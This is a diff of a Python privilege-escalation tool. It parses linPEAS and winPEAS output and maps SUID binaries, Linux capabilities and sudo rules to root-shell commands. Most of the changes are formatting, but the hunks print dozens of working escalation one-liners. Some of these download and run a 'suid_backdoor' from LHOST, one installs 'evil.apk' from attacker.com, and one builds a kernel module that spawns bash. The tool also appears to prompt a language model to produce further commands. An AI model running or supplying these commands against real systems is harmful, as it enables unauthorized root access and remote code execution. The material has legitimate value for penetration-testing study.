@@ -173,9 +173,7 @@ def parse_linpeas_output(text: str) -> SystemProfile:
     """
     profile = SystemProfile(os_type="linux", raw_linpeas=text)
 
-    kernel_match = re.search(
-        r"(?:Linux version|uname\s+-a).*?((\d+\.\d+[\d.]*)\S*)", text, re.IGNORECASE
-    )
+    kernel_match = re.search(r"(?:Linux version|uname\s+-a).*?((\d+\.\d+[\d.]*)\S*)", text, re.IGNORECASE)
     if kernel_match:
         profile.kernel_version = kernel_match.group(2).strip(".-")
 
@@ -191,29 +189,17 @@ def parse_linpeas_output(text: str) -> SystemProfile:
     if arch_match:
         profile.arch = arch_match.group(1).strip()
 
-    profile.suid_binaries = re.findall(
-        r"(?:Vulnerable to|SUID).*?(/[^\s]+)", text, re.IGNORECASE
-    )
+    profile.suid_binaries = re.findall(r"(?:Vulnerable to|SUID).*?(/[^\s]+)", text, re.IGNORECASE)
     if not profile.suid_binaries:
-        profile.suid_binaries = re.findall(
-            r"(?:-rws|rws).*?(/(?:usr/|bin/|sbin/|opt/)[^\s\n]+)", text
-        )
+        profile.suid_binaries = re.findall(r"(?:-rws|rws).*?(/(?:usr/|bin/|sbin/|opt/)[^\s\n]+)", text)
 
-    profile.capabilities = re.findall(
-        r"cap_.*?(?:=|\+).*?(/[^\s]+)", text, re.IGNORECASE
-    )
+    profile.capabilities = re.findall(r"cap_.*?(?:=|\+).*?(/[^\s]+)", text, re.IGNORECASE)
 
-    profile.writable_paths = re.findall(
-        r"Writable.*?(/[^\s\n]+)", text, re.IGNORECASE
-    )
+    profile.writable_paths = re.findall(r"Writable.*?(/[^\s\n]+)", text, re.IGNORECASE)
 
-    profile.cron_jobs = re.findall(
-        r"(?:cron|CRON).*?(/.+?)(?:\n|$)", text, re.IGNORECASE
-    )
+    profile.cron_jobs = re.findall(r"(?:cron|CRON).*?(/.+?)(?:\n|$)", text, re.IGNORECASE)
 
-    profile.sudo_rules = re.findall(
-        r"User\s+\S+\s+may\s+run.*?(/.+?)\)", text, re.IGNORECASE
-    )
+    profile.sudo_rules = re.findall(r"User\s+\S+\s+may\s+run.*?(/.+?)\)", text, re.IGNORECASE)
 
     for line in text.splitlines():
         if "docker" in line.lower() and ("available" in line.lower() or "socket" in line.lower()):
@@ -248,9 +234,7 @@ def parse_winpeas_output(text: str) -> SystemProfile:
     if arch_match:
         profile.arch = arch_match.group(1).strip()
 
-    profile.sudo_rules = re.findall(
-        r"AlwaysInstallElevated.*?(Enabled|1)", text, re.IGNORECASE
-    )
+    profile.sudo_rules = re.findall(r"AlwaysInstallElevated.*?(Enabled|1)", text, re.IGNORECASE)
 
     svc_tokens = re.findall(
         r"(?:Unquoted\s+Service\s+Path|Modifiable\s+Service).*?([A-Z]:\\[^\s\n]+)",
@@ -314,22 +298,22 @@ def suid_vectors(profile: SystemProfile) -> list[PrivescVector]:
 
     known_exploitable = {
         "find": "find . -exec /bin/sh -p \\; -quit",
-        "vim": "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
-        "nmap": 'echo "os.execute(\'/bin/sh\')" > /tmp/root.nse && nmap --script=/tmp/root.nse',
+        "vim": 'vim -c \':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
+        "nmap": "echo \"os.execute('/bin/sh')\" > /tmp/root.nse && nmap --script=/tmp/root.nse",
         "bash": "bash -p",
         "python": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'",
-        "perl": 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh -p"\'',
+        "perl": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh -p\"'",
         "ruby": "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh -p\"'",
         "php": "php -r \"posix_setuid(0); system('/bin/sh -p');\"",
-        "awk": 'awk \'BEGIN {system("/bin/sh -p")}\'',
+        "awk": "awk 'BEGIN {system(\"/bin/sh -p\")}'",
         "less": "less /etc/passwd\n!/bin/sh",
-        "more": 'TERM= more /etc/passwd\n!/bin/sh',
+        "more": "TERM= more /etc/passwd\n!/bin/sh",
         "man": "man man\n!/bin/sh",
         "cp": "cp /bin/sh /tmp/rooted && chmod u+s /tmp/rooted",
         "mv": "mv /bin/sh /tmp/rooted && chmod u+s /tmp/rooted",
         "tar": "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
         "rsync": "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
-        "gdb": "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"sh <$(tty) >$(tty) 2>$(tty)\")' -ex quit",
+        "gdb": 'gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-c", "sh <$(tty) >$(tty) 2>$(tty)")\' -ex quit',
         "systemctl": "TF=$(mktemp).service; echo '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"chmod u+s /bin/bash\"\n[Install]\nWantedBy=multi-user.target' >$TF; systemctl link $TF; systemctl enable --now $TF",
         "pkexec": "pkexec /bin/sh",
         "env": "env /bin/sh -p",
@@ -339,7 +323,7 @@ def suid_vectors(profile: SystemProfile) -> list[PrivescVector]:
         "busybox": "busybox sh -p",
         "ash": "ash -p",
         "csh": "csh -b",
-        "node": "node -e 'var exec = require(\"child_process\").exec; exec(\"chmod u+s /bin/sh\")'",
+        "node": 'node -e \'var exec = require("child_process").exec; exec("chmod u+s /bin/sh")\'',
         "wget": "TF=$(mktemp); wget -O $TF http://LHOST/suid_backdoor; chmod +x $TF; $TF",
         "curl": "TF=$(mktemp); curl -o $TF http://LHOST/suid_backdoor; chmod +x $TF; $TF",
     }
@@ -398,7 +382,7 @@ def capability_vectors(profile: SystemProfile) -> list[PrivescVector]:
         ),
         "cap_sys_module": (
             "CAP_SYS_MODULE",
-            "echo -e '#include <linux/kmod.h>\\nvoid init(void) { call_usermodehelper(\"/bin/bash\", NULL, NULL, UMH_WAIT_PROC); }\\n__attribute__((section(\".modinfo\"))) char info[] = \"license=GPL\";' > lkm.c && make -C /lib/modules/$(uname -r)/build M=$(pwd) modules",
+            'echo -e \'#include <linux/kmod.h>\\nvoid init(void) { call_usermodehelper("/bin/bash", NULL, NULL, UMH_WAIT_PROC); }\\n__attribute__((section(".modinfo"))) char info[] = "license=GPL";\' > lkm.c && make -C /lib/modules/$(uname -r)/build M=$(pwd) modules',
             "T1547.006",
         ),
         "cap_dac_read_search": (
@@ -540,11 +524,11 @@ def sudo_vectors(profile: SystemProfile) -> list[PrivescVector]:
         "journalctl": "sudo journalctl\n!/bin/sh",
         "git": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
         "ftp": "sudo ftp\n!/bin/sh",
-        "gdb": "sudo gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\")' -ex quit",
-        "node": "sudo node -e 'var exec = require(\"child_process\").exec; exec(\"chmod u+s /bin/sh\")'",
-        "pip": "TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\", \"sh\")' > $TF/setup.py; sudo pip install $TF",
+        "gdb": 'sudo gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh")\' -ex quit',
+        "node": 'sudo node -e \'var exec = require("child_process").exec; exec("chmod u+s /bin/sh")\'',
+        "pip": 'TF=$(mktemp -d); echo \'import os; os.execl("/bin/sh", "sh")\' > $TF/setup.py; sudo pip install $TF',
         "apt-get": "sudo apt-get changelog apt\n!/bin/sh",
-        "dpkg": 'sudo dpkg -l\n!/bin/sh',
+        "dpkg": "sudo dpkg -l\n!/bin/sh",
         "apk": "sudo apk add --allow-untrusted -X https://attacker.com/evil evil.apk",
         "su": "sudo su -",
         "bash": "sudo bash",
@@ -653,12 +637,8 @@ def _load_gtfobins_map() -> dict[str, str]:
         if pq_path.exists():
             try:
                 df = pd.read_parquet(pq_path)
-                name_col = next(
-                    (c for c in df.columns if c.lower() in ("binary", "name", "nombre", "binario")), None
-                )
-                desc_col = next(
-                    (c for c in df.columns if c.lower() in ("description", "info", "category")), None
-                )
+                name_col = next((c for c in df.columns if c.lower() in ("binary", "name", "nombre", "binario")), None)
+                desc_col = next((c for c in df.columns if c.lower() in ("description", "info", "category")), None)
                 if name_col:
                     for _, row in df.iterrows():
                         name = str(row[name_col]).strip()
@@ -706,14 +686,14 @@ System type: {profile.os_type}
 Kernel version: {profile.kernel_version}
 Distro: {profile.distro}
 Architecture: {profile.arch}
-Groups: {', '.join(profile.groups) if profile.groups else 'unknown'}
+Groups: {", ".join(profile.groups) if profile.groups else "unknown"}
 Docker available: {profile.docker_available}
 LXD available: {profile.lxd_available}
-SUID binaries (sample): {', '.join(profile.suid_binaries[:10]) if profile.suid_binaries else 'none found'}
-Capabilities (sample): {', '.join(profile.capabilities[:5]) if profile.capabilities else 'none found'}
-Sudo rules (sample): {', '.join(profile.sudo_rules[:5]) if profile.sudo_rules else 'none detected'}
-Writable paths: {', '.join(profile.writable_paths[:5]) if profile.writable_paths else 'none found'}
-Services (Windows): {', '.join(profile.services[:5]) if profile.services else 'N/A'}
+SUID binaries (sample): {", ".join(profile.suid_binaries[:10]) if profile.suid_binaries else "none found"}
+Capabilities (sample): {", ".join(profile.capabilities[:5]) if profile.capabilities else "none found"}
+Sudo rules (sample): {", ".join(profile.sudo_rules[:5]) if profile.sudo_rules else "none detected"}
+Writable paths: {", ".join(profile.writable_paths[:5]) if profile.writable_paths else "none found"}
+Services (Windows): {", ".join(profile.services[:5]) if profile.services else "N/A"}
 
 Output format — one vector per line:
 NAME | TECHNIQUE | CONFIDENCE | DESCRIPTION | COMMAND | CVE (optional)
@@ -906,7 +886,9 @@ def format_crystal_ball_output(result: dict[str, Any]) -> str:
     for i, v in enumerate(vectors, 1):
         color = conf_colors.get(v.get("confidence", "LOW"), GREEN)
         lines.append(f"   {BOLD}{i}. {v['name']}{RESET}")
-        lines.append(f"      {MAGENTA}Confidence:{RESET} {color}{v['confidence']}{RESET}  {MAGENTA}Technique:{RESET} {v['technique']}")
+        lines.append(
+            f"      {MAGENTA}Confidence:{RESET} {color}{v['confidence']}{RESET}  {MAGENTA}Technique:{RESET} {v['technique']}"
+        )
         if v.get("cve"):
             lines.append(f"      {MAGENTA}CVE:{RESET}       {BRIGHT_CYAN}{v['cve']}{RESET}")
         if v.get("mitre_id"):
